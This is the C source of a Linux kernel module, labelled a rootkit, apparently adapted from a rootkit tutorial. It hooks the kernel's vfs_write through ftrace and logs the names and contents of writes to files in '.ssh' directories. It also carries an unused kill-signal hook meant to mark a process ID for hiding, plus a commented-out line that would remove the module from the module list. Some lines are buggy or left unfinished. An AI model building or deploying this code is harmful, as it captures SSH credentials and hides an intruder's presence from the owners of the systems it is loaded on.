#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/file.h>






#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");


char hide_pid[NAME_MAX];



// static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_write)(const struct pt_regs *);
static asmlinkage ssize_t (*orig_vfs)(struct file *file, const char __user *buf, size_t count, loff_t *pos);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

// asmlinkage int hook_mkdir(const struct pt_regs *regs)
// {
//     char __user *pathname = (char *)regs->di;
//     char dir_name[NAME_MAX] = {0};

//     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

//     if (error > 0)
//         printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

//     orig_mkdir(regs);
//     return 0;
// }


// asmlinkage long hook_write(const struct pt_regs *regs)
// {
//     long ret;
//     int fd = regs->di;
//     // char __user *buf = regs->si;
//     // size_t count = regs->dx;

//     // struct fd filed = fdget_pos(fd);

//     // char filename[NAME_MAX];
    
//     // strcpy(filename,filed.file->f_path.dentry->d_name.name);

    

//     // printk(KERN_INFO "rootkit: trying to write to a file %s", filename);

//     ret = orig_write(regs);
//     return ret;
// }

asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char filename[NAME_MAX];
    char directory[NAME_MAX];

    char buffer[count];

//    FILE *fptr;

    strcpy(filename, file->f_path.dentry->d_name.name);
    strcpy(directory, file->f_path.dentry->d_parent->d_name.name);

    if(strcmp(".ssh", directory) == 0)
    {
        printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
        printk(KERN_INFO "rootkit: bytes being written %s", buf);

      //  fprt = fopen("test.txt","w");
      //  fprintf(fptr,"%s", buf);
    }




    
    
    return orig_vfs(file, buf, count, pos);
}


asmlinkage int hook_kill(const struct pt_regs *regs)
{
    /*
     * Pull out the arguments we need from the pt_regs struct
     */
    pid_t pid = regs->di;
    int sig = regs->si;

    /*
     * If the signal is 64, then print a message to the kernel buffer and
     * write the PID as a string to hide_pid
     */
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d%", pid);
        return 0;
    }

    /*
     * Otherwise, just return the real sys_kill
     */
    return orig_kill(regs);
}


static struct ftrace_hook hooks[] = {
    // HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    //HOOK("__x64_sys_write", hook_write, &orig_write),
    HOOK("vfs_write", vfs_h_write, &orig_vfs),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    //list_del(&THIS_MODULE->list);

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);